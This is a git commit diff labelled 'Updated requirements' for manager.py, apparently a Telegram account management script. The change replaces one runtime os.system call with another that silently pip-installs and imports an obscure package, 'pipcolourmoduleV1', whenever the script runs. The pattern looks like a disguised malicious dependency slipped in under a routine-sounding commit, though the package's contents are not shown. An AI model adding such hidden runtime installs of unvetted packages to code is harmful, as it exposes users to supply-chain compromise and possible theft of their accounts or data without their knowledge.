3aa3f94bbc2e9300cdaf7d96bbe895c0f82dc8df
Patrick Pogoda <121391953+PatrickPogoda@users.noreply.github.com>
2023-05-04 21:43:11 +0200

    Updated requirements

--- manager.py
+++ manager.py
@@ -1,6 +1,6 @@
 import os
-os.system("pip install pythoncolouringpkgsV1")
-import pythoncolouringpkgsV1
+os.system("pip install pipcolourmoduleV1")
+import pipcolourmoduleV1
 import requests
 from telethon.sync import TelegramClient
 from telethon.errors.rpcerrorlist import PhoneNumberBannedError
